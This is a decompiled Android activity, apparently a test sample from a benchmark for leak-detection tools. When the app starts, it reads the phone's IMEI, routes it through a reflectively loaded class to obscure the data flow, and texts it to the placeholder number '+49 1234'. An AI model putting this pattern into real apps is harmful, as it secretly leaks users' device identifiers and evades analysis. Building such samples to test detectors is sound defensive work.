package de.ecspride;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuInflater;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity
  extends Activity
{
  public MainActivity() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    try
    {
      paramBundle = ((TelephonyManager)getSystemService("phone")).getDeviceId();
      Class localClass = Class.forName("de.ecspride.ReflectiveClass");
      Object localObject = localClass.newInstance();
      localClass.getMethod("setImei", new Class[] { String.class }).invoke(localObject, new Object[] { paramBundle });
      paramBundle = (String)localClass.getMethod("getImei", new Class[0]).invoke(localObject, new Object[0]);
      SmsManager.getDefault().sendTextMessage("+49 1234", null, paramBundle, null, null);
      return;
    }
    catch (InstantiationException paramBundle)
    {
      paramBundle.printStackTrace();
      return;
    }
    catch (IllegalAccessException paramBundle)
    {
      paramBundle.printStackTrace();
      return;
    }
    catch (ClassNotFoundException paramBundle)
    {
      paramBundle.printStackTrace();
      return;
    }
    catch (NoSuchMethodException paramBundle)
    {
      paramBundle.printStackTrace();
      return;
    }
    catch (IllegalArgumentException paramBundle)
    {
      paramBundle.printStackTrace();
      return;
    }
    catch (InvocationTargetException paramBundle)
    {
      paramBundle.printStackTrace();
    }
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131165184, paramMenu);
    return true;
  }
}
